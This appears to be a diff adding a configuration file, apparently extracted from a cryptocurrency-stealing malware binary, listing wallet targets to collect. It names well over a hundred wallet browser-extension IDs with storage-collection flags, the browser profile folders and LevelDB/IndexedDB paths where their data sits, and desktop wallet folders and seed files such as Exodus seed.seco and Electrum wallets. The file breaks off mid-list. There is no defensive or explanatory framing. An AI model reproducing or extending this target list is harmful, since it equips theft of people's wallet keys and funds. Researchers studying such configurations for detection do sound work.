@@ -1,0 +1,2103 @@
+{
+ "wallet_collector_targets (file offset 0x2d5535)": {
+  "$schema": "wallet-collector-targets-v1",
+  "browser_extensions": [
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+    "name": "MetaMask"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+    "name": "Phantom"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "egjidjbpglichdcondbcbdnbeeppgdph",
+    "name": "Trust"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+    "name": "Coinbase"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "acmacodkjbdgmoleebolmdjonilkdbch",
+    "name": "Rabby"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "fnjhmkhhmkbjkkabndcnnogagogbneec",
+    "name": "Ronin"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
+    "name": "TronLink"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ffnbelfdoeiohenkjibnmadjiehjhajb",
+    "name": "Yoroi"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dmkamcknogkgcdfhhbddcghachkejeap",
+    "name": "Keplr"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ppbibelpcjmhbdihakflkdcoccbgbkpo",
+    "name": "UniSat"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "aeachknmefphepccionboohckonoeemg",
+    "name": "Coin98"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bhhhlbepdkbapadjdnnojkbgioiodbic",
+    "name": "Solflare"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "nphplpgoakhhjchkkhmiggakijnkhfnd",
+    "name": "TON Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "omaabbefbmiijedngplfjmnooppbclkk",
+    "name": "Tonkeeper"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "idnnbdplmphpflfnlkomgpfbpcgelopg",
+    "name": "Xverse"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "mcohilncbfahbmgdjkbpemcciiolgcge",
+    "name": "OKX"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "opfgelmcmbiajamepnmloijbpoleiama",
+    "name": "Rainbow"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
+    "name": "Math Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jnlgamecbpmbajjfhmmmlhejkemejdma",
+    "name": "Braavos"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "opcgpfmipidbgpenhmajoajpbobppdil",
+    "name": "Slush - A Sui wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cadiboklkpojfamcoggejbbdjcoiljjk",
+    "name": "Binance Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mfgccjchihfkkindfppnaooecgfneiii",
+    "name": "TokenPocket"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fldfpgipfncgndfolcbkdeeknbbbnhcc",
+    "name": "MyTonWallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lpilbniiabackdjcionkobglmddfbcjo",
+    "name": "Keeper Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jiidiaalihmmhddjgbnbgdfflelocpak",
+    "name": "Bitget Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ojggmchlghnjlapmfbnjholfjkiidbch",
+    "name": "Venom Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "aflkmfhebedbjioipglgcbcmnbpgliof",
+    "name": "Backpack"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "klghhnkeealcohjjanjjdaeeggmfmlpl",
+    "name": "Zerion"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mkpegjkblkkefacfnmkajcjmabijhclg",
+    "name": "Magic Eden"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "agoakfejjabomempkjlepdflaleeobhb",
+    "name": "Core"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "onhogfjeacnfoofkfgppdlbmlmnplgbn",
+    "name": "SubWallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fijngjgcjhjmmpcmkeiomlglpeiijkld",
+    "name": "Talisman"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ldinpeekobnhjjdofggfgjlcehhmanlj",
+    "name": "Leather"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ejjladinnckdgjemekebdpeokbikhfci",
+    "name": "Petra"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lfcmbodjdaklmnbanalifjjnkldngine",
+    "name": "Suiet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ookjlbkiijinhpmnjffcofjonbfbgaoc",
+    "name": "Temple"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kkpllkodjeloidieedojogacfhpaihoh",
+    "name": "Enkrypt"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fiikommddbeccaoicoejoniammnalkfa",
+    "name": "Nightly"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "lgmpcpglpngdoalbgeoldeajfclnhafa",
+    "name": "SafePal"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fpkhgmpbidmiogeglndfbkegfdlnajnf",
+    "name": "Cosmostation"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "ejbalbakoplchlghecdalmeeeajnimhm",
+    "name": "MetaMask"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "ljfoeinjpaedjfecbmggjgodbgkmjkjk",
+    "name": "MetaMask"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "pbpjkcldjiffchgbbndmhojiacbgflha",
+    "name": "OKX"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fhbohimaelbohpjbbldcngcnapndodjp",
+    "name": "Binance Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "aholpfdialjgjfhomihkjbmgjidlcdno",
+    "name": "Exodus"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dlcobpjiigpikoobohmabehhmhfoodbb",
+    "name": "Argent X"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lpfcbjknijpeeillifnkikgncikgfhdo",
+    "name": "Nami"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kmhcihpebfmpgmihbkipmjlmmioameka",
+    "name": "Eternl"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hifafgmccdpekplomjjkcfgodnhcellj",
+    "name": "Crypto.com"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jnmbobjmhlngoefaiojfljckilhhlhcj",
+    "name": "OneKey"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fcfcfllfndlomdhbehjjcoimbgofdncg",
+    "name": "Leap"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gojhcdgcpbpfigcaejpfhfegekdgiblk",
+    "name": "Opera Crypto Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mpeengabcnhhjjgleiodimegnkpcenbk",
+    "name": "HOT Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "efbglgofoippbgcjepnhiblaibcnclgk",
+    "name": "Martian"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "phkbamefinggmakgklpkljjmgibohnba",
+    "name": "Pontem"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "pdliaogehgdbhbnmkklieghmmjkpigpa",
+    "name": "Bybit Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lmkncnlpeipongihbffpljgehamdebgi",
+    "name": "DPal"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dpcklmdombjcplafheapiblogdlgjjlb",
+    "name": "OrdiFind Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ffbceckpkpbcmgiaehlloocglmijnpmp",
+    "name": "Initia Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "iledlaeogohbilgbfhmbgkgmpplbfboh",
+    "name": "Jupiter Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ablmompanofnodfdkgchkpmphailefpb",
+    "name": "Miden Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ofdhacekldfhmkmpcehoembfckabgnln",
+    "name": "Solana Tap"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kifcalgkjaphbpbcgokommchjiimejah",
+    "name": "Frontrun"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jiiigigdinhhgjflhljdkcelcjfmplnd",
+    "name": "Mango Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "pcndjhkinnkaohffealmlmhaepkpmgkb",
+    "name": "Meteor Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kbdcddcmgoplfockflacnnefaehaiocb",
+    "name": "Shell Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cnmamaachppnkjgnildpdmkaakejnhae",
+    "name": "Auro Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "einnioafmpimabjcddiinlhmijaionap",
+    "name": "Wander"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lpnfhpbpmlobjlgkdmnjieeihjmihhjd",
+    "name": "Console Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hbneiaclpaaglopiogfdhgccebncnjmc",
+    "name": "TanglePay"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mljponncmhdlacmjbophphkbgcgjdnff",
+    "name": "MyDoge"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jblacjfeljfigeglloiclnoehlhnmgne",
+    "name": "Ethos Everywhere"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "aiifbnbfobpmeekipheeijimdpnlpgpp",
+    "name": "Station Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "pmbjpcmaaladnfpacpmhmnfmpklgbdjb",
+    "name": "OP_WALLET"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dbgibbbeebmbmmhmebogidfbfehejgfo",
+    "name": "Naoris Protocol Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ajkhoeiiokighlmdnlakpjfoobnjinie",
+    "name": "Station Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bifidjkcdpgfnlbcjpdkdcnbiooooblg",
+    "name": "Fuelet Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hcjhpkgbmechpabifbggldplacolbkoh",
+    "name": "StarKey Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "epapihdplajcdnnkdeiahlgigofloibg",
+    "name": "Sender Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "epbdphmhjbjiemaeabfkghhopangghli",
+    "name": "Dogeshit Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lbjapbcmmceacocpimbpbidpgmlmoaao",
+    "name": "Metalet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hbbgbephgojikajhfbomhlmmollphcad",
+    "name": "Rise"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mfoghjbpfanobmnoemoepenjjcmfpmdn",
+    "name": "Noir Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "anokgmphncpekkhclmingpimjmcooifb",
+    "name": "Compass Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "nhccebmfjcbhghphpclcfdkkekheegop",
+    "name": "Pelagus"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mjgkpalnahacmhkikiommfiomhjipgjn",
+    "name": "Reef Chain Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "khpkpbbcccdmmclmpigdgddabeilkdpd",
+    "name": "Suiet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gjnckgkfmgmibbkoficdidcljeaaaheg",
+    "name": "Atomic Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "flpiciilemghbmfalicajoolhkkenfel",
+    "name": "ICONex"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jmgipjhlmabpmcikcahmmgleghckefjg",
+    "name": "VOFO Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "emeeapjkbcbpbpgaagfchmcgglmebnen",
+    "name": "Surf Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bofddndhbegljegmpmnlbhcejofmjgbn",
+    "name": "eckoWALLET"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cnncmdhjacpkmjmkcafchppbnpnhdmon",
+    "name": "HAVAH Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ifckdpamphokdglkkdomedpdegcjhjdp",
+    "name": "ONTO Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cgddkajmbckbjbnondgfcbcojjjdnmji",
+    "name": "Mavryk Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "anknhjilldkeelailocijnfibefmepcc",
+    "name": "0xio Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cphhlgmgameodnhkjdmkpanlelnlohao",
+    "name": "NeoLine"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bfeplaecgkoeckiidkgkmlllfbaeplgm",
+    "name": "Radix Wallet Connector"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "nnpmfplkfogfpmcngplhnbdnnilmcdcg",
+    "name": "Uniswap Extension"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ikangkldolpfbhoaofklijfecbfhpaak",
+    "name": "Modulo"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "akoiaibnepcedcplijmiamnaigbepmcb",
+    "name": "Yoroi"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "djclckkglechooblngghdinmeemkbgci",
+    "name": "MetaMask"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
+    "name": "Ctrl Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cpmkedoipcpimgecpmgpldfpohjplkpp",
+    "name": "Gate Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gfenajajnjjmmdojhdjmnngomkhlnfjl",
+    "name": "Enkrypt"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "apenkfbbpmhihehmihndmmcdanacolnh",
+    "name": "SafePal"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kjmoohlgokccodicjjfebfomlbljgfhk",
+    "name": "Ronin"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "efknohjclbjfppcmniflbmnokbihoofp",
+    "name": "Keplr"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "infeboajgfhgbjpjbeppbkgnabfdkdaf",
+    "name": "OneKey"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "iokeahhehimjnekafflcihljlcjccdbe",
+    "name": "Alby"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gafhhkghbfjjkeiendhlofajokpaflmk",
+    "name": "Lace"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lnnnmfcpbkafcpgdilckhmhbkkbpkmid",
+    "name": "Koala Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gjagmgiddbbciopjhllkdnddhcglnemk",
+    "name": "HashPack"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "lccbohhgfkdikahanoclbdmaolidjdfl",
+    "name": "Wigwam"
+   },
+   {
+    "collect_local_storage": true,
+    "collect_sync_storage": true,
+    "id": "ehgjhhccekdedpbkifaojjaefeohnoea",
+    "name": "Ambire"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ggafhcdaplkhmmnlbfjpnnkepdfjaelb",
+    "name": "Vultisig"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "eajafomhmkipbjmfmhebemolkcicgfmd",
+    "name": "Taho"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "heamnjbnflcikcggoiplibfommfbkjpj",
+    "name": "Zeal"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "pmmnimefaichbcnbndcfpaagbepnjaig",
+    "name": "FoxWallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gpnihlnnodeiiaakbikldcihojploeca",
+    "name": "NuFi"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bedogdpgdnifilpgeianmmdabklhfkcn",
+    "name": "VESPR"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kfdniefadaanbjodldohaedphafoffoh",
+    "name": "Typhon"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mopnmbcafieddcagagdcbnhejhlodfdd",
+    "name": "polkadot.js"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dldjpboieedgcmpkchcjcbijingjcgok",
+    "name": "Fuel Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "nebnhfamliijlghikdgcigoebonmoibm",
+    "name": "Leo Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "dngmlblcodfobpdpecaadgfbcggfjfnm",
+    "name": "MultiversX"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cfbfdhimifdmdehjmkdobpcjfefblkjm",
+    "name": "Plug"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bcacfldlkkdogcmkkibnjlakofdplcbk",
+    "name": "Freighter"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hpclkefagolihohboafpheddmmgdffjm",
+    "name": "Flow Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "gjlmehlldlphhljhpnlddaodbjjcchai",
+    "name": "Nautilus"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "nhlnehondigmgckngjomcpcefcdplmgc",
+    "name": "Fearless Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mdfiknlkblgfipbjlnkgcpbelfjoakio",
+    "name": "KuCoin Web3"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
+    "name": "Guarda"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "penjlddjkjgpnkllboccdgccekpkcbin",
+    "name": "OpenMask"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jblndlipeogpafnldhgmapagcccfchpi",
+    "name": "Kaia Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hklhheigdmpoolooomdihmhlpjjdbklf",
+    "name": "KasWare"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ebfidpplhabeedpnhjnobghokpiioolj",
+    "name": "Fewcha"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ejbidfepgijlcgahbmbckmnaljagjoll",
+    "name": "Salmon Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ilolmnhjbbggkmopnemiphomhaojndmb",
+    "name": "Oyl Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "jfflgdhkeohhkelibbefdcgjijppkdeb",
+    "name": "OrdPay"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bdgmdoedahdcjmpmifafdhnffjinddgc",
+    "name": "TAO Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fdojfgffiecmmppcjnahfgiignlnehap",
+    "name": "Bitlight"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "momakdpclmaphlamgjcndbgfckjfpemp",
+    "name": "BitMask"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "khaifnjdhfaadfhgbilokobnaalmimad",
+    "name": "Zucchini"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "akcgnllhhhkcpmlenfpicmcpgfpindlb",
+    "name": "Zano Companion"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bopcbmipnjdcdfflfgjdgdjejmgpoaab",
+    "name": "BlockWallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kcfmcpdmlchhbikbogddmgopmjbflnae",
+    "name": "X1 Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "kjjebdkfeagdoogagbhepmbimaphnfln",
+    "name": "Ultra Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "lnamkkidoonpeknminiadpgjiofpdmle",
+    "name": "UTXO Global"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "cmognolnbgnhncfebdpefiddpdbbilnn",
+    "name": "UKey Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "ldjonnkfjmcingabncepnibledcanmoe",
+    "name": "Kaspire"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fngpibmhccdaokelgaccddiehlggihlo",
+    "name": "BitBit"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "olobejhimilbacjmmhpcokekiaapfojm",
+    "name": "OpenBit"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "mobgoaaconpcicgajnpclkelkmjigiak",
+    "name": "Omega Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "bmkakpenjmcpfhhjadflneinmhboecjf",
+    "name": "WELLDONE"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "aeejnlpgpblnoedcdeogmdmfkhhhabpf",
+    "name": "DOSI"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "infmfhepglaadcfmcebnpeoaogbcmjig",
+    "name": "GET Wallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "hjkdfdaiphnlpodbcbcmomecfdblbojl",
+    "name": "CakeWallet"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "fjalkkkbjffhgdoheannkodafhemfdba",
+    "name": "Universe Bitcoin"
+   },
+   {
+    "collect_local_storage": false,
+    "collect_sync_storage": true,
+    "id": "egebedonbdapoieedfcfkofloclfghab",
+    "name": "GemWallet XRPL"
+   }
+  ],
+  "chromium_profile_roots": [
+   "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
+   "%LOCALAPPDATA%\\Google\\Chrome Beta\\User Data",
+   "%LOCALAPPDATA%\\Google\\Chrome Dev\\User Data",
+   "%LOCALAPPDATA%\\Google\\Chrome SxS\\User Data",
+   "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
+   "%LOCALAPPDATA%\\Microsoft\\Edge Beta\\User Data",
+   "%LOCALAPPDATA%\\Microsoft\\Edge SxS\\User Data",
+   "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data",
+   "%APPDATA%\\Opera Software\\Opera Stable",
+   "%APPDATA%\\Opera Software\\Opera GX Stable",
+   "%LOCALAPPDATA%\\Vivaldi\\User Data",
+   "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data",
+   "%LOCALAPPDATA%\\Chromium\\User Data",
+   "%LOCALAPPDATA%\\CocCoc\\Browser\\User Data",
+   "%LOCALAPPDATA%\\Thorium\\User Data",
+   "%LOCALAPPDATA%\\Arc\\User Data"
+  ],
+  "chromium_relative_paths": {
+   "extension_settings": "Local Extension Settings\\{ext_id}",
+   "indexeddb": "IndexedDB\\chrome-extension_{ext_id}_0.indexeddb.leveldb",
+   "indexeddb_blob": "IndexedDB\\chrome-extension_{ext_id}_0.indexeddb.blob",
+   "local_storage_leveldb": "Local Storage\\leveldb",
+   "sync_extension_settings": "Sync Extension Settings\\{ext_id}"
+  },
+  "crypto_tool_extensions": [
+   {
+    "id": "pdgbckgdncnhihllonhnjbdoighgpimk",
+    "name": "Wallet Guard"
+   },
+   {
+    "id": "bgooiolaoinoncegoopcmincbomphmhi",
+    "name": "Moni"
+   },
+   {
+    "id": "nmniboccheadcclilkfkonokbcoceced",
+    "name": "Revoke.cash"
+   },
+   {
+    "id": "ieldiilncjhfkalnemgjbffmpomcaigi",
+    "name": "Portal DEX"
+   },
+   {
+    "id": "gacgndbocaddlemdiaadajmlggabdeod",
+    "name": "Pocket Universe"
+   },
+   {
+    "id": "ekbbplmjjgoobhdlffmgeokalelnmjjc",
+    "name": "OpenLedger Node"
+   }
+  ],
+  "desktop_wallets": [
+   {
+    "files": [
+     "seed.seco",
+     "info.seco",
+     "*.seco",
+     "*.wallet",
+     "*"
+    ],
+    "name": "Exodus",
+    "paths": [
+     "%APPDATA%\\Exodus\\exodus.wallet",
+     "%APPDATA%\\Exodus"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electrum",
+    "paths": [
+     "%APPDATA%\\Electrum\\wallets",
+     "%LOCALAPPDATA%\\Electrum\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electrum-LTC",
+    "paths": [
+     "%APPDATA%\\Electrum-LTC\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electrum-SV",
+    "paths": [
+     "%APPDATA%\\ElectrumSV\\wallets",
+     "%APPDATA%\\Electrum-SV\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electron-Cash",
+    "paths": [
+     "%APPDATA%\\ElectronCash\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat",
+     "wallet.dat-journal"
+    ],
